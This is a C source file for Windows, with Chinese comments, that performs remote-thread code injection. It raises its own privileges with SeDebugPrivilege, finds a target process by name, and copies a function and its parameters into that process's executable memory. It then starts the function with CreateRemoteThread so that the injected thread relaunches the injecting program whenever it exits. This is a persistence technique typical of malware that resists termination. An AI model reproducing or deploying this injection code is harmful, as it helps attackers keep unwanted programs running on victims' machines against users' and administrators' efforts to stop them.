#include <Windows.h>
#include <shlobj.h>
#include "injection.h"
#include <TCHAR.h>
typedef struct _remoteparameter
{
    DWORD        rpWaitForSingleObject;
    DWORD        rpOpenProcess;
    DWORD       rpWinExec;
    DWORD        rpProcessPID;           
    HANDLE        rpProcessHandle;
    char        path[MAX_PATH];
}REMOTEPARAM;
DWORD WINAPI remote(LPVOID pvparam)
{
    REMOTEPARAM *rp=(REMOTEPARAM*)pvparam;  //传递进来的信息
	
    typedef UINT            (WINAPI *EWinExec)                (LPCSTR, UINT);
    typedef HANDLE            (WINAPI *EOpenProcess)            (DWORD, BOOL, DWORD);
    typedef DWORD            (WINAPI *EWaitForSingleObject)    (HANDLE, DWORD);
	
	
    EWinExec                tWinExec;
    EOpenProcess            tOpenProcess;
    EWaitForSingleObject    tWaitForSingleObject;
	
	
    tOpenProcess            =(EOpenProcess)rp->rpOpenProcess;
    tWaitForSingleObject    =(EWaitForSingleObject)rp->rpWaitForSingleObject;
    tWinExec                =(EWinExec)rp->rpWinExec;
	
	
    rp->rpProcessHandle=tOpenProcess(PROCESS_ALL_ACCESS,FALSE,rp->rpProcessPID);//打开要保护的进程
	
    tWaitForSingleObject(rp->rpProcessHandle,INFINITE);//要保护的进程是否结束
    
    tWinExec(rp->path, SW_SHOW);//如果结束就重新启动程序
    return 0;
}
DWORD processtopid(char *processname)//跟据进程名称取PID值
{
    DWORD    lpidprocesses[1024],cbneeded,cprocesses;
    HANDLE   hprocess;
    HMODULE  hmodule;
    UINT     i;
    TCHAR    normalname[MAX_PATH]=("UnknownProcess");
    
    if(!EnumProcesses(lpidprocesses,sizeof(lpidprocesses),&cbneeded))
    {
        return -1;  
    }
    cprocesses=cbneeded/sizeof(DWORD);
    for(i=0;i<cprocesses;i++)
    {
        hprocess=OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,FALSE,lpidprocesses[i]);
        if(hprocess)
        {
            if(EnumProcessModules(hprocess,&hmodule,sizeof(hmodule),&cbneeded))
            {
                GetModuleBaseName(hprocess,hmodule,normalname,sizeof(normalname));
                if(!strcmp(normalname,processname))  
                {
                    CloseHandle(hprocess);
                    return (lpidprocesses[i]);
                }
            }
        }
    }
    CloseHandle(hprocess);
    return 0;
}
HANDLE CreateRemoteThreadProc(char* ProcessName)
{
        HANDLE    ThreadHandle;
        char    FilePath[MAX_PATH];
        GetModuleFileName(NULL,FilePath,MAX_PATH);//获取自身目录
        int procID=processtopid(ProcessName);
        HINSTANCE         hkernel32;
        HANDLE            rphandle;
        char             *remotethr;
        char             *remotepar;
        int               cb;

         rphandle=OpenProcess(PROCESS_CREATE_THREAD|     
                              PROCESS_VM_OPERATION|     
                              PROCESS_VM_WRITE,           
                              FALSE,procID);

        /*****************************************************************/
                        /*将远程线程函数代码拷入目标进程*/
        /*****************************************************************/

        cb=sizeof(char)*4*1024;

        remotethr=(PTSTR)VirtualAllocEx(rphandle,NULL,cb,MEM_COMMIT,PAGE_EXECUTE_READWRITE); 
        if(remotethr==NULL)
        {
            CloseHandle(rphandle);       
        }
        if(WriteProcessMemory(rphandle,remotethr,(LPVOID)remote,cb,NULL)==FALSE)
        {
            CloseHandle(rphandle);
        }

        /*****************************************************************/
                        /*将远程线程函数参数拷入目标进程*/
                        /*这里需要重定位远程线程需要的API*/
        /*****************************************************************/

        REMOTEPARAM rp;
        memset((char*)&rp,0,sizeof(rp));

        hkernel32=GetModuleHandle("kernel32.dll");

        if(hkernel32==NULL)
        {
			return 0;
        }

        rp.rpProcessPID            =GetCurrentProcessId();
        rp.rpOpenProcess        =(DWORD)GetProcAddress(hkernel32,"OpenProcess");
        rp.rpWinExec            =(DWORD)GetProcAddress(hkernel32,"WinExec");
        rp.rpWaitForSingleObject=(DWORD)GetProcAddress(hkernel32,"WaitForSingleObject");
        _tcscpy(rp.path,FilePath);   


        cb=sizeof(char)*sizeof(rp);
        remotepar=(PTSTR)VirtualAllocEx(rphandle,NULL,cb,MEM_COMMIT,PAGE_READWRITE);
        if(remotepar==NULL)
        {
            CloseHandle(rphandle);
        }

        if(WriteProcessMemory(rphandle,remotepar,(LPVOID)&rp,cb,NULL)==FALSE)
        {
            CloseHandle(rphandle);
        }

 

        /*****************************************************************/
                        /*将远程线程注入目标进程*/
        /*****************************************************************/

        ThreadHandle=CreateRemoteThread(rphandle,NULL,0,(LPTHREAD_START_ROUTINE)remotethr,(LPVOID)remotepar,0,NULL);
        if(ThreadHandle==NULL)
        {
            CloseHandle(rphandle);
        }
        return ThreadHandle;
}
BOOL EnablePriv()//提升进程权限
{
    HANDLE hToken;
    if ( OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES,&hToken) )
    {
        TOKEN_PRIVILEGES tkp;
        
        LookupPrivilegeValue( NULL,SE_DEBUG_NAME,&tkp.Privileges[0].Luid );    //修改进程权限
        tkp.PrivilegeCount=1;
        tkp.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges( hToken,FALSE,&tkp,sizeof tkp,NULL,NULL );    //通知系统修改进程权限
    }
	return 0;
}